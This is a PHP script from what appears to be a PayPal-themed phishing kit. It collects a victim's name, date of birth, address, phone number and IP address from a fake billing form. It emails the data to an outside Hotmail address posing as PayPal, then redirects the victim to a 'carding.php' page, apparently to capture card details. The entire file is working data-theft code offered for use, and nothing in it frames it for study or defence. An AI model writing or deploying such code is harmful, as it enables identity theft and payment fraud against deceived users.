<?php include "encriptar.php";?>
<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Country = $_POST['country'];
if(!empty($_POST['fname']) &&  !empty($_POST['address']) && !empty($_POST['country'])  && !empty($_POST['postal']) )
{
$message .= "=========[BY M4!L3R !NB0X]=========\n";
$message .= "Full Name  : ".$_POST['fname']."\n";
$message .= "Date of birth  : ".$_POST['bday']."-".$_POST['bmonth']."-".$_POST['byear']."\n";
$message .= "Address 1  : ".$_POST['address']."\n";
$message .= "address 2  : ".$_POST['address2']."\n";
$message .= "Country  : ".$_POST['country']."\n";
$message .= "City  : ".$_POST['city']."\n";
$message .= "State  : ".$_POST['state']."\n";
$message .= "ZIP  : ".$_POST['postal']."\n";
$message .= "Phone  : ".$_POST['phone']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[By M4!L3R !NB0X]=========";

include 'MonEmail.php';
$subject = "BILLING FROM [$Country] [$ip]";
$to="the-pay-pal@hotmail.com";
mail($to, $subject, $message);

header("Location:carding.php");
}
else
{
header("Location:billing.php");
echo'please fill all fields';
}


?>